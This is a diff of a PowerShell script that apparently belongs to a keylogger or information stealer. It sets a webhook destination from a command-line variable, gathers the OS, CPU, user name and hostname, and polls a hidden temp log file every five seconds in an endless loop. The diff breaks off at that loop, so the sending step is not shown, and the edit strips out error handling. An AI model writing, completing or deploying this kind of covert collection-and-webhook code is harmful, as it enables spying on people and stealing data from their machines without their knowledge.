@@ -1,23 +1,14 @@
-param(
-    [string]$dc  # Webhook URL passed as a parameter
-)
-
-# Define the webhook URL
-$webhookURL = $dc
+# Ensure that the webhook URL is set directly from the command line
+$webhookURL = $dc  # $dc is the variable passed via the command line
 
 # Define the path to the temp log file
 $tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'temp_log.txt')
 
-# Get additional system info with error handling for missing info
-$osInfo = Get-WmiObject -Class Win32_OperatingSystem -ErrorAction SilentlyContinue
-$cpuInfo = Get-WmiObject -Class Win32_Processor -ErrorAction SilentlyContinue
+# Get additional system info
+$osInfo = Get-WmiObject -Class Win32_OperatingSystem
+$cpuInfo = Get-WmiObject -Class Win32_Processor
 $userInfo = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
 $hostname = $env:COMPUTERNAME
-
-# Set defaults in case any info is missing
-if (-not $osInfo) { $osInfo = New-Object PSObject -property @{ Caption = "Unknown OS" } }
-if (-not $cpuInfo) { $cpuInfo = New-Object PSObject -property @{ Name = "Unknown CPU" } }
-if (-not $hostname) { $hostname = "Unknown Hostname" }
 
 # Start an infinite loop to check the file every 5 seconds
 while ($true) {
